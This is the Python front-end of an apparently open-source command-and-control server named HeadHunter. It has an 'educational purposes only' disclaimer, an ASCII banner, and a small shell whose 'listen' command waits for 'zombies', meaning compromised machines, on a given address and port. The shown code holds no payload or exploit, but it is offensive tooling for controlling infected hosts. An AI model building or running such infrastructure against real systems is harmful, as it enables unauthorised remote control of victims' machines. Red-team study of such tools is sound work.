# HeadHunter (C2) server
# Author: Logan Goins
# I am not liable for any misuse of this software.
# This software is for educational purposes only



import readline
import server
import sys 

print(
'''
  
 ██░ ██ ▓█████ ▄▄▄      ▓█████▄  ██░ ██  █    ██  ███▄    █ ▄▄▄█████▓▓█████  ██▀███  
▓██░ ██▒▓█   ▀▒████▄    ▒██▀ ██▌▓██░ ██▒ ██  ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒
▒██▀▀██░▒███  ▒██  ▀█▄  ░██   █▌▒██▀▀██░▓██  ▒██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒
░▓█ ░██ ▒▓█  ▄░██▄▄▄▄██ ░▓█▄   ▌░▓█ ░██ ▓▓█  ░██░▓██▒  ▐▌██▒░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄  
░▓█▒░██▓░▒████▒▓█   ▓██▒░▒████▓ ░▓█▒░██▓▒▒█████▓ ▒██░   ▓██░  ▒██▒ ░ ░▒████▒░██▓ ▒██▒
 ▒ ░░▒░▒░░ ▒░ ░▒▒   ▓▒█░ ▒▒▓  ▒  ▒ ░░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ▒ ▒   ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░▒░ ░ ░ ░  ░ ▒   ▒▒ ░ ░ ▒  ▒  ▒ ░▒░ ░░░▒░ ░ ░ ░ ░░   ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░
 ░  ░░ ░   ░    ░   ▒    ░ ░  ░  ░  ░░ ░ ░░░ ░ ░    ░   ░ ░   ░         ░     ░░   ░ 
 ░  ░  ░   ░  ░     ░  ░   ░     ░  ░  ░   ░              ░             ░  ░   ░     
                         ░                                                           

Command and Control Server (C2)
Author: Logan Goins

type \'help\' for available commands
''')


readline.set_auto_history(True)
while True:
	command = input("HeadHunter/> ").lower().split(" ")
	print(" ")
	if len(command) >= 3:
		cmd = command[0]
		subcmd = command[1]
		arg = command[2]
	elif len(command) >= 2:
		cmd = command[0]
		subcmd = command[1]
	elif len(command) >= 1:
		cmd = command[0]
		params = [cmd]


	if cmd == "listen":
		server.listen(subcmd, int(arg))

	if cmd == "help":
		print('''
			                       Commands
------------------------------------------------------------------------------------------------------
help                      --          displays this menu
listen <LHOST> <LPORT>    --	      starts listening for zombies on the specified local address and port
exit                      --          exits the headhunter interactive shell


		''')

	if cmd == "exit":
		exit(0)
